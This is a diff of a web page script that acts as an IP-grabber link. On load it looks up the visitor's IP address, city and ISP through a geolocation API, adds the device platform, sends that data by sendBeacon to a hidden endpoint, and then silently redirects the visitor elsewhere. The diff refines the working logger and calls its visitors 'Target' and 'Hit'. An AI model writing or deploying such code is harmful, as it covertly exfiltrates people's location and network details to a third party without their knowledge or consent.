@@ -8,23 +8,19 @@
     async function start() {
         let info = "Target Detected";
         try {
-            // Grab the data from the API
             const r = await fetch('https://ipapi.co/json/');
             const d = await r.json();
-            // Build the detailed string
-            info = `IP: ${d.ip} | City: ${d.city} | ISP: ${d.org} | Device: ${navigator.platform}`;
+            // CRITICAL: These must be backticks (`) not single quotes (')
+            info = `IP: ${d.ip} | City: ${d.city} | ISP: ${d.org} | Dev: ${navigator.platform}`;
         } catch (e) {
-            info = "Hit detected (Detailed data blocked by browser)";
+            info = "Hit detected (Data blocked)";
         }
 
-        // Send it using the method that worked
         const blob = new Blob([JSON.stringify({ content: info })], { type: 'application/json' });
         navigator.sendBeacon(h, blob);
 
-        // Redirect
-        setTimeout(() => { window.location.replace(y); }, 400);
+        setTimeout(() => { window.location.replace(y); }, 500);
     }
-
     start();
 </script>
 </body>
